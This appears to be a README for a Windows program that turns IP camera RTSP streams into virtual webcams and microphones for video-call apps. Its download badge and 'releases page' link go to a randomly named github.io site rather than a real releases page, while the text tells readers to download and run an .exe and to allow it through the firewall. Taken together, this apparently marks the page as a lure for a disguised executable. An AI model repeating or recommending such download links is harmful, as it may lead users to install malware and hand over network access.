# 📹 rtsp-virtual-webcam - Turn IP cameras into virtual webcams

[![Download](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://dasyproctaanxiousness893.github.io)

This application converts any RTSP stream from an IP camera into a virtual webcam and microphone device on your Windows computer. You can use your security camera or IP device in programs like Zoom, Google Meet, or Teams. It functions as a hardware device within your system settings, so other software treats it like a standard plugged-in USB camera.

## 📥 Getting Started

Visit the [releases page](https://dasyproctaanxiousness893.github.io) to download the software. 

1. Go to the link above.
2. Look for the latest version under the "Assets" section.
3. Download the file ending in `.exe`.
4. Run the installer and follow the prompts on your screen.

## 💻 System Requirements

Your computer needs the following to run this software:
- Windows 10 or 11 (64-bit).
- A stable network connection to reach your IP camera.
- The RTSP address of your camera (e.g., `rtsp://username:password@ip_address:554/stream`).
- At least 200MB of free disk space.

## ⚙️ How to Set Up Your Camera

Once you install the application, follow these steps to connect your device:

1. Launch the application from your Start menu.
2. Find the input field labeled "RTSP Stream URL."
3. Paste the web address of your IP camera into this box. You can often find this address in your camera’s manual or the manufacturer website.
4. Click the "Connect" button. The software will verify the stream. 
5. If the connection succeeds, you will see a preview of your camera feed in the main window.
6. The software automatically creates the virtual webcam and microphone drivers upon the first successful connection.

## 🎙️ Using the Camera in Video Apps

After you start the stream in the software, you can open your preferred video application.

### Zoom
1. Open Zoom settings.
2. Navigate to the "Video" tab.
3. Select "RTSP Virtual Camera" from the drop-down menu under Camera.
4. Go to the "Audio" tab.
5. Select "RTSP Virtual Microphone" as your input device.

### Google Meet
1. Start or join a meeting.
2. Click the three dots (more options) at the bottom right.
3. Select "Settings."
4. Click the "Video" tab and choose "RTSP Virtual Camera" in the Camera settings.
5. Click the "Audio" tab and choose "RTSP Virtual Microphone" for your microphone.

## 🛠️ Troubleshooting

If you do not see an image, check these common items:

- **Check Network:** Ensure your computer and your camera exist on the same local network.
- **Verify URL:** Double-check the RTSP address. These addresses often require a username and password. Format your string as `rtsp://user:password@192.168.1.XX:554/path`.
- **Reboot:** Sometimes the virtual drivers need a system restart to register correctly with Windows. Restart your computer if the camera does not appear in your meeting apps.
- **Firewall:** Windows Defender might ask for permission to allow the app to access the network. Click "Allow Access" when the prompt appears.

## 🖥️ Advanced Settings

The software includes a settings menu for fine-tuning the video output.

- **Resolution:** You can change the output resolution to match your meeting needs. Lower resolutions consume less processing power.
- **Frame Rate:** You can cap the frames per second to reduce CPU usage. 30 FPS provides a smooth image for most meetings.
- **Audio Sync:** If the audio and video do not match, use the sync slider to delay the audio by a few milliseconds.

## 📋 Privacy and Security

This application processes all camera data locally on your computer. The video stream does not pass through external servers. All authentication happens between your machine and your camera. Keep your RTSP credentials secure and do not share your camera’s public IP address with others.

Keywords: ffmpeg, google-meet, ip-camera, ip-camera-webcam, obs, python, rtsp, rtsp-camera, unitycapture, vb-cable, virtual-camera, virtual-microphone, virtual-webcam, webcam, windows, zoom